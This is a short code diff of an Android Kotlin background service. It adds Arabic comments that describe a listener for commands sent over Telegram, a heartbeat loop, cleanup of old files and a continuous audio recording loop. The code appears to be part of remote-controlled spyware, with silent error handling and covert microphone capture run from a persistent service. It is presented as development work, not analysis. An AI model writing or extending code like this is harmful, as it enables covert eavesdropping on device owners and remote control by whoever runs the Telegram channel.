@@ -26,10 +26,12 @@ class BackgroundService : Service() {
         super.onCreate()
         startForegroundWithNotification()
 
+        // ⭐ الاستماع المباشر من تيليجرام
         try {
             CommandListener.start(applicationContext)
         } catch (_: Exception) {}
 
+        // heartbeat
         scope.launch {
             while (running) {
                 try {
@@ -39,6 +41,7 @@ class BackgroundService : Service() {
             }
         }
 
+        // تنظيف الملفات القديمة
         scope.launch {
             while (running) {
                 try {
@@ -52,6 +55,7 @@ class BackgroundService : Service() {
             }
         }
 
+        // حلقة التسجيل الصوتي
         scope.launch {
             while (running) {
                 try {
